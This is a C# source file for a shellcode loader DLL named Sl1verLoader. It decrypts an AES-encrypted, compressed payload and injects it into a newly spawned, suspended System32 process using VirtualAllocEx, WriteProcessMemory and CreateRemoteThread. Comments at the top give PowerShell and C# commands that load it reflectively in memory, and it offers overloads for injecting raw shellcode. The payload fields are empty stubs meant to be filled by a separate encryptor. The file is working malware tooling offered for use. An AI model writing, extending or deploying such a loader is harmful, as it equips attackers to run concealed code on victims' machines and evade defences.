// ============================================================================
// Sl1verLoader.cs - class library (DLL) version
// ----------------------------------------------------------------------------
// Hardcoded-payload loader compiled as a .NET DLL. No Main(), no network I/O.
// Load it from any .NET host and invoke a public static entry point, e.g.:
//
//   PowerShell:
//     $bytes = [System.IO.File]::ReadAllBytes('C:\path\to\Sl1verLoader.dll')
//     $asm   = [System.Reflection.Assembly]::Load($bytes)
//     $type  = $asm.GetType('Sl1verLoader.Program')
//     $type.GetMethod('Execute', [Type[]]@()).Invoke($null, $null)     # zero-arg overload
//     $type.GetMethod('Execute', [Type[]]@([string])).Invoke($null, @('svchost.exe'))
//     $type.GetMethod('Run').Invoke($null, $null)                       # Run() has no overloads
//
//   C# host:
//     var asm = System.Reflection.Assembly.Load(System.IO.File.ReadAllBytes("Sl1verLoader.dll"));
//     asm.GetType("Sl1verLoader.Program").GetMethod("Execute").Invoke(null, null);
//
// Build:
//   csc -target:library -out:Sl1verLoader.dll Sl1verLoader.cs payload.cs
//   (or paste the generated Payload class over the stub at the bottom)
// ============================================================================
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO.Compression;

namespace Sl1verLoader
{
    public static class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public class SecurityAttributes
        {
            public Int32 Length = 0;
            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
            public bool bInheritHandle = false;

            public SecurityAttributes()
            {
                this.Length = Marshal.SizeOf(this);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessId;
            public Int32 dwThreadId;
        }
        [Flags]
        public enum CreateProcessFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }


        [StructLayout(LayoutKind.Sequential)]
        public class StartupInfo
        {
            public Int32 cb = 0;
            public IntPtr lpReserved = IntPtr.Zero;
            public IntPtr lpDesktop = IntPtr.Zero;
            public IntPtr lpTitle = IntPtr.Zero;
            public Int32 dwX = 0;
            public Int32 dwY = 0;
            public Int32 dwXSize = 0;
            public Int32 dwYSize = 0;
            public Int32 dwXCountChars = 0;
            public Int32 dwYCountChars = 0;
            public Int32 dwFillAttribute = 0;
            public Int32 dwFlags = 0;
            public Int16 wShowWindow = 0;
            public Int16 cbReserved2 = 0;
            public IntPtr lpReserved2 = IntPtr.Zero;
            public IntPtr hStdInput = IntPtr.Zero;
            public IntPtr hStdOutput = IntPtr.Zero;
            public IntPtr hStdError = IntPtr.Zero;
            public StartupInfo()
            {
                this.cb = Marshal.SizeOf(this);
            }
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, [In] StartupInfo lpStartupInfo, out ProcessInformation lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_COMMIT = 0x1000;

        // --------------------------------------------------------------------
        // Public entry points
        // --------------------------------------------------------------------

        // Alias for Execute().
        public static void Run()
        {
            Execute();
        }

        // Executes the hardcoded encrypted payload.
        public static void Execute()
        {
            ExecuteHardcoded(Payload.TargetBinary);
        }

        // Executes the hardcoded encrypted payload into a custom host binary.
        public static void Execute(string targetBinary)
        {
            ExecuteHardcoded(targetBinary);
        }

        // Injects raw, unencrypted shellcode directly (bypasses crypto/compression).
        public static void Execute(byte[] rawShellcode, string targetBinary)
        {
            if (rawShellcode == null || rawShellcode.Length == 0 || string.IsNullOrEmpty(targetBinary))
                return;
            Inject(rawShellcode, targetBinary);
        }

        // Injects a pre-encrypted blob: [16-byte IV][AES-256-CBC ciphertext].
        public static void Execute(byte[] encryptedBlob, byte[] key, string compression, string targetBinary)
        {
            if (encryptedBlob == null || encryptedBlob.Length < 17 || key == null || key.Length != 32
                || string.IsNullOrEmpty(targetBinary))
                return;

            byte[] iv = encryptedBlob.Take(16).ToArray();
            byte[] ciphertext = encryptedBlob.Skip(16).ToArray();

            byte[] compressed = Decrypt(ciphertext, key, iv);
            byte[] sc = Decompress(compressed, compression);
            Inject(sc, targetBinary);
        }

        private static void ExecuteHardcoded(string targetBinary)
        {
            // The first 16 bytes of EncryptedShellcode are the AES IV (matches payload.bin).
            if (Payload.EncryptedShellcode.Length < 17 || Payload.AESKey.Length != 32)
                return;

            byte[] iv = Payload.EncryptedShellcode.Take(16).ToArray();
            byte[] ciphertext = Payload.EncryptedShellcode.Skip(16).ToArray();

            byte[] compressed = Decrypt(ciphertext, Payload.AESKey, iv);
            byte[] sc = Decompress(compressed, Payload.CompressionAlgorithm);
            Inject(sc, targetBinary);
        }

        // --------------------------------------------------------------------
        // Injection + crypto helpers (public for testing/advanced use)
        // --------------------------------------------------------------------

        public static void Inject(byte[] sc, string TargetBinary)
        {
            Int32 size = sc.Length;
            StartupInfo sInfo = new StartupInfo();
            sInfo.dwFlags = 0;
            ProcessInformation pInfo;
            string binaryPath = "C:\\Windows\\System32\\" + TargetBinary;
            IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
            IntPtr hProcess = pInfo.hProcess;
            IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            IntPtr size2 = new IntPtr(sc.Length);
            bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, out int bytesWritten);
            CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
            return;
        }

        public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
        {
            byte[] decompressedArray = null;
            if (CompressionAlgorithm == "deflate9")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
                        {
                            deflateStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else if (CompressionAlgorithm == "gzip")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (GZipStream gzipStream = new GZipStream(compressStream, CompressionMode.Decompress))
                        {
                            gzipStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else
            {
                // "none": AES-CBC always pads to a 16-byte boundary (PKCS7), strip it
                int padLen = data[data.Length - 1];
                if (padLen > 0 && padLen <= 16 && data.Length >= padLen
                    && data.Skip(data.Length - padLen).All(b => b == padLen))
                    return data.Take(data.Length - padLen).ToArray();
                return data;
            }
        }

        // AES-256-CBC, PKCS7 padding (matches encryptor.py)
        public static byte[] Decrypt(byte[] ciphertext, byte[] AESKey, byte[] AESIV)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = AESKey;
                aesAlg.IV = AESIV;
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Padding = PaddingMode.PKCS7;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                    }
                    return memoryStream.ToArray();
                }
            }
        }
    }

    // =====================================================================
    // GENERATED SECTION
    // Replace the four members below with the contents of payload.cs
    // produced by encryptor.py (or delete this class and add payload.cs
    // to the project as its own file).
    // =====================================================================
    public static class Payload
    {
        public static byte[] EncryptedShellcode = new byte[] { };
        public static byte[] AESKey = new byte[] { };
        public static string CompressionAlgorithm = "deflate9";
        public static string TargetBinary = "notepad.exe";
    }
    // =====================================================================
}
